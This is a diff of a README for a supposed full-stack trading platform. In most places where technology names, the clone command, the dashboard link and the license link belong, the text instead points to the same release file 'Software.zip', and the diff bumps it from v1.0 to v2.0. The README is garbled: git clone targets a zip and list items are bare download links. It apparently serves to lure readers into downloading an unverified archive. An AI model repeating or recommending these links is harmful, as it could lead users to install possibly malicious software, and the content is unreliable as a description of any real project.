@@ -17,7 +17,7 @@ Welcome to the Trading-Platform repository! This repository houses a full stack 
 - Utilization of React components for a dynamic and engaging user interface.
 - Integration of Material-UI for a visually appealing design.
 - Secure data storage using MongoDB with Mongoose for efficient management.
-- Powerful backend support with https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip and https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip
+- Powerful backend support with https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip and https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip
 - CORS proxy for secure cross-origin resource sharing.
 - Automatic server restarts with Nodemon for hassle-free development.
 - React Router for smooth navigation within the platform.
@@ -25,10 +25,10 @@ Welcome to the Trading-Platform repository! This repository houses a full stack 
 ## Technologies
 The Trading-Platform repository covers a wide range of technologies to ensure a robust and efficient trading experience. Some of the key technologies used in this project include:
 - React
-- https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip
+- https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip
 - MongoDB
 - Mongoose
-- https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip
+- https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip
 - Axios
 - JSX
 - Material-UI
@@ -40,13 +40,13 @@ The Trading-Platform repository covers a wide range of technologies to ensure a 
 To get started with the Trading-Platform repository, follow these simple steps:
 1. Clone the repository to your local machine using the following command:
 ```bash
-git clone https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip
+git clone https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip
 ```
 2. Install the necessary dependencies by running:
 ```bash
 npm install
 ```
-3. Launch the dashboard by visiting the following link: [Dashboard Link](https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip) 🚀
+3. Launch the dashboard by visiting the following link: [Dashboard Link](https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip) 🚀
 
 ## Usage
 Once the installation process is complete, you can start exploring the trading platform prototype. Here are a few steps to get you started:
@@ -61,6 +61,6 @@ npm start
 If you are passionate about trading platforms and want to contribute to this project, feel free to submit a pull request. Your contributions are highly appreciated and will help improve the platform for traders worldwide.
 
 ## License
-This project is licensed under the MIT License - see the [https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip](https://github.com/FinMVP/Trading-Platform/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip](https://github.com/FinMVP/Trading-Platform/releases/download/v2.0/Software.zip) file for details.
 
 🌟 Happy Trading! 🌟
